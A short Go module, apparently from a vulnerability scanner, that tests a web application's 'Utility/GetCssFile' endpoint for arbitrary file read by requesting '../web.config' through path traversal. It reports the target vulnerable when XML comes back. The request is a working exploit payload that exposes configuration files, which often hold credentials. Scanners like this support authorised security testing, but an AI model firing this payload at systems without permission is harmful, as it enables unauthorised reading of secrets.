package vulList

import (
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"strings"
)

func GetCssFileCheck(target string) error {
	baseurl := target + "Utility/GetCssFile?filePath=../web.config"
	resp, err := http.Get(baseurl)
	if err != nil {
		return fmt.Errorf("Error sending request: %v", err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("Error reading response body: %v", err)
	}

	responseBody := string(body)

	if strings.Contains(responseBody, `<?xml version="1.0"?>`) {
		green := color.New(color.FgGreen)
		green.Println("[+]GetCsFile arbitrary file read vulnerability")
		fmt.Println()
	} else {
		fmt.Println("[-]GetCsFile arbitrary file read vulnerability")
		fmt.Println()
	}
	return nil
}
